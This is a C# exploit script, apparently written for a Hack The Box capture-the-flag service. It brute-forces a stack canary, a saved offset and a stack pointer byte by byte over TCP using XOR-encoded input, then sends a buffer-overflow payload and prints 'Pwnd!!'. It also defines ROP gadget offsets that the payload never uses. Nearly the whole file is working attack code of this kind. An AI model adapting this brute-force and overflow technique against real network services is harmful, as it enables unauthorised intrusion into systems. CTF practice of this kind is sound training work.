using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Net.Sockets;

namespace dSocket
{
    public class Rop
    {
        public const int RAX = 0x0000000000000b51; // pop rax; ret
        public const int RBP = 0x0000000000000a90; // pop rbp; ret
        public const int RDI = 0x0000000000000f73; // pop rdi; ret
        public const int RDX = 0x0000000000000b53; // pop rdx; ret
        public const int RSIplus = 0x0000000000000f71; // pop rsi; pop r15; ret
        public const int RSPplus = 0x0000000000000f6d; // pop rsp; pop r13; pop r14; pop r15; ret
        public const int LeaveR = 0x0000000000000b6d; // leave ; ret
        public const int Syscall = 0x0000000000000b55; // syscall ; ret
    }
    class Program
    {
        private const string Host = "docker.hackthebox.eu";
        private const int Port = 46854;

        private static Socket ConnectSocket()
        {
            IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            // IPAddress ipAddress = IPAddress.Parse(Host);
            IPEndPoint ipe = new IPEndPoint(ipAddress, Port);

            Socket mySock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                mySock.Connect(ipe);
            }
            catch (ArgumentNullException ane)
            {
                Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
            }
            catch (SocketException se)
            {
                Console.WriteLine("SocketException : {0}", se.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected exception : {0}", e.ToString());
            }
            return mySock;
        }
        private static byte[] XorMe(byte[] inputBuffer)
        {
            byte[] returnBuffer = new byte[inputBuffer.Length];
            for (int i = 0; i < inputBuffer.Length; i++)
            {
                returnBuffer[i] = (byte)(inputBuffer[i] ^ 0x0d);
            }
            return returnBuffer;
        }
        private static byte[] GetCanaryAndOffset(byte[] inputBuffer)
        {
            byte[] stubXOR;
            int totalFound = 0;
            byte[] bytes = new byte[1024];

            while (totalFound < 24)
            {
                byte[] returnBuffer = new byte[inputBuffer.Length + 1];
                for (int h = 0x00; h <= 0xff; h += 0x01)
                {
                    // add new byte to array                    
                    stubXOR = new byte[] { (byte)(h ^ 0x0d) };
                    List<byte> list1 = new List<byte>(inputBuffer);
                    List<byte> list2 = new List<byte>(XorMe(stubXOR));
                    list1.AddRange(list2);
                    returnBuffer = list1.ToArray();

                    // test new byte
                    Socket testSocket = ConnectSocket();
                    testSocket.ReceiveTimeout = 1000;
                    int bytesRec = testSocket.Receive(bytes);
                    testSocket.Send(returnBuffer);
                    bytesRec = 0;
                    Array.Clear(bytes, 0, bytes.Length);
                    try
                    {
                        bytesRec = testSocket.Receive(bytes);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Skipping dead byte..");
                    }
                    testSocket.Close();

                    if (bytesRec > 0)
                    {
                        inputBuffer = returnBuffer;
                        totalFound++;
                        if (inputBuffer.Length == 1033)
                        {
                            Console.Write("[+] Success! Canary: ");
                        }
                        else if (inputBuffer.Length == 1041)
                        {
                            Console.Write("\n[+] Success! Offset: ");
                        }
                        else if (inputBuffer.Length == 1049)
                        {
                            Console.Write("[+] Success! RSP: ");
                        }
                        if (inputBuffer.Length > 1032)
                        {
                            Console.Write("{0}", h.ToString("x2"));
                            if (totalFound == 16)
                            {
                                Console.WriteLine("");
                            }
                        }
                        break;
                    }
                }
            }

            // display canary and offset
            byte[] RSP = new byte[] { inputBuffer[1055], inputBuffer[1054], inputBuffer[1053], inputBuffer[1052],
                                            inputBuffer[1051], inputBuffer[1050], inputBuffer[1049], inputBuffer[1048] };
            byte[] offSet = new byte[] { inputBuffer[1047], inputBuffer[1046], inputBuffer[1045], inputBuffer[1044],
                                            inputBuffer[1043], inputBuffer[1042], inputBuffer[1041], inputBuffer[1040] };
            byte[] caNary = new byte[] { inputBuffer[1039], inputBuffer[1038], inputBuffer[1037], inputBuffer[1036],
                                            inputBuffer[1035], inputBuffer[1034], inputBuffer[1033], inputBuffer[1032] };
            offSet = XorMe(offSet);
            caNary = XorMe(caNary);
            RSP = XorMe(RSP);

            string canaryStr = "0x";
            string offsetStr = "0x";
            string RSPStr = "0x";

            for (int j = 0; j < 8; j++)
            {
                canaryStr += caNary[j].ToString("x2");
                offsetStr += offSet[j].ToString("x2");
                RSPStr += RSP[j].ToString("x2");
            }

            Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}\tRSP: {2}", offsetStr, canaryStr, RSPStr);

            return inputBuffer;
        }
        private static byte[] GetPayload()
        {
            byte[] bytes = new byte[1024];
            byte[] correctUser = new byte[] { 0x64, 0x61, 0x76, 0x69, 0x64, 0x65, 0x0d, 0x78 };
            byte[] filler = new byte[1024];
            for (int i = 0; i < filler.Length; i++)
            {
                filler[i] = 0x41;
            }
            byte[] toReturn = new byte[correctUser.Length + filler.Length];
            Buffer.BlockCopy(correctUser, 0, toReturn, 0, correctUser.Length);
            Buffer.BlockCopy(filler, 0, toReturn, correctUser.Length, filler.Length);

            toReturn = GetCanaryAndOffset(toReturn);

            return toReturn;
        }
        private static void _end(Socket mySocket)
        {
            byte[] bytes = new byte[1024];
            int bytesRec2 = mySocket.Receive(bytes);
            mySocket.Close();
            if (bytesRec2 > 0)
            {
                Console.Write(" - payload + canary + offset VERIFIED!!\n");
            }
            Console.WriteLine("[+] Pwnd!!  Hit ENTER to exit.");
            Console.ReadKey();
        }
        private static void _pwn()
        {
            Console.WriteLine("[~] Let's rage!!\n[*] Beginning brute force");

            byte[] bytes = new byte[1024];

            // get payload
            byte[] myPayload = GetPayload();
            if (myPayload.Length > 0)
            {
                Console.WriteLine("[+] Payload generated");
            }

            // connect
            Socket mySocket = ConnectSocket();
            int bytesRec3 = mySocket.Receive(bytes);
            if (bytesRec3 > 0)
            {
                Console.WriteLine("[+] Connected");
            }

            // send it
            mySocket.Send(myPayload);
            Console.Write("[+] Payload sent");

            // profit
            _end(mySocket);
        }

        private static void Main(string[] args)
        {
            _pwn();
        }
    }
}
